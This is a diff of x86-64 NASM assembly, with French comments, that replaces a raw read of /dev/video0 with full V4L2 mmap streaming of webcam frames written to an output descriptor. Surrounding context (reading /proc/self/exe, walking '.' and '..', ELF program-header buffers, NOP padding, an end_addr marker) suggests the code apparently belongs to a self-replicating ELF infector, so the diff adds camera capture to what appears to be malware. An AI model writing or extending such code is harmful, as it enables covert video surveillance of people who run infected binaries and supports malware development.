@@ -872,7 +872,7 @@ end_:
 
 		mov		rax, SYS_open
 		lea		rdi, [rel pathv]
-		xor		rsi, rsi
+		mov		rsi, 2
 		NOP
 		NOP
 		NOP
@@ -906,39 +906,104 @@ end_:
 		test	rax, rax
 		jnz		.closing_video
 
-		lea		rdi, [rel buff] ; bien clean le buff au cas ou pour la video
-		mov		rcx, 512
-		xor		rax, rax
-		NOP
-		NOP
-		NOP
-		NOP
-		rep		stosq
+		;struct v4l2_requestbuffers { C'est un buffer les formalites
+		;	__u32 count;          // le nombre de tampons
+		;	__u32 type;           // le type de tampons
+		;	__u32 memory;         // le type de memoire
+		;	__u32 reserved[2];    //
+		;};
 
-		mov		rcx, 10
-		.loop_video
-
-		push	rcx
-		mov		rdx, 4096
-		mov		rax, SYS_read
+		mov		dword [reqb    ], NBUF
+		mov		dword [reqb + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [reqb + 8], V4L2_MEMORY_MMAP
+		xor		eax, eax
+		mov		[reqb + 12], eax  ; reserved = 0
+		mov		rax, SYS_ioctl
 		mov		rdi, r12
-		lea		rsi, [rel buff]
+		mov		rsi, VIDIOC_REQBUFS
+		lea		rdx, [rel reqb]
 		syscall
-		pop		rcx
 
-		cmp		rax, 0
-		jle		.closing_video
+%assign i 0
+%rep NBUF
+		mov		dword [v4buf], i
+		mov		dword [v4buf + 4], V4L2_BUF_TYPE_VIDEO_CAPTURE
+		mov		dword [v4buf + 60], V4L2_MEMORY_MMAP
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_QUERYBUF
+		lea		rdx, [rel v4buf]
+		syscall
 
-		push	rcx
-		mov		rdx, rax
+		mov		rax, SYS_mmap
+		xor		rdi, rdi                          ; addr = NULL
+		mov		edx, [v4buf + 72]                 ; length (dword) → edx
+		mov		esi, edx                          ; rsi = length
+		mov		edx, PROT_READ | PROT_WRITE       ; rdx
+		mov		r10, MAP_SHARED
+		mov		r8,  r12                          ; fd
+		mov		r9,  [v4buf + 64]                 ; offset (qword)
+		syscall
+		mov		[buf_addrs + i*8], rax            ; save address
+		mov		eax, [v4buf + 72]
+		mov		[buf_sizes + i*8], rax            ; save size (dword → qword)
+
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_QBUF
+		lea		rdx, [rel v4buf]
+		syscall
+%assign i i+1
+%endrep
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_STREAMON
+		lea		rdx, [rel cap_type]
+		syscall
+
+		mov		rcx, FRAMES
+		.loop_frames:
+		push rcx
+		; DQBUF ---------------------------------------------------------
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_DQBUF
+		lea		rdx, [rel v4buf]
+		syscall
+
+		; sortir la frame sur stdout
+		mov		ebx, [v4buf]                      ; index (dword)
+		mov		edx, [v4buf + 8]                  ; bytesused
+		mov		rsi, [buf_addrs + rbx*8]          ; addr
+		mov		rdi, r13                          ; stdout
 		mov		rax, SYS_write
-		mov		rdi, r13
-		lea		rsi, [rel buff]
 		syscall
-		pop		rcx
 
-		loop	.loop_video
+		; remettre le tampon dans la file (QBUF) ------------------------
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_QBUF
+		lea		rdx, [rel v4buf]
+		syscall
+		pop rcx
 
+		loop	.loop_frames
+
+
+		mov		rax, SYS_ioctl
+		mov		rdi, r12
+		mov		rsi, VIDIOC_STREAMOFF
+		lea		rdx, [rel cap_type]
+		syscall
+
+%assign i 0
+%rep NBUF
+		mov		rax, SYS_munmap
+		mov		rdi, [buf_addrs + i*8]
+		mov		rsi, [buf_sizes + i*8]
+		syscall
+%assign i i+1
+%endrep
 		.closing_video:
 		mov		rax, SYS_close
 		mov		rdi, r12
@@ -1016,6 +1081,7 @@ _stop:
 	self	db '/proc/self/exe', 0
 	last	db '..', 0
 	curr	db '.', 0
+	cap_type dd V4L2_BUF_TYPE_VIDEO_CAPTURE
 	pathv	db '/dev/video0', 0
 	one		db 1
 	zero	db 0
@@ -1101,5 +1167,8 @@ buffer_bss:
 	buff	times 4096 db 0
 	elfp0	times 0056 db 0
 	elfp1	times 0056 db 0
-
+	buf_addrs   times NBUF dq 0  ; adresses mmap des tampons
+	buf_sizes   times NBUF dq 0   ; leurs tailles
+	reqb        times 16   db 0         ; struct v4l2_requestbuffers
+	v4buf       times 88   db 0      ; struct v4l2_buffer (x86-64 = 88 o)
 end_addr:
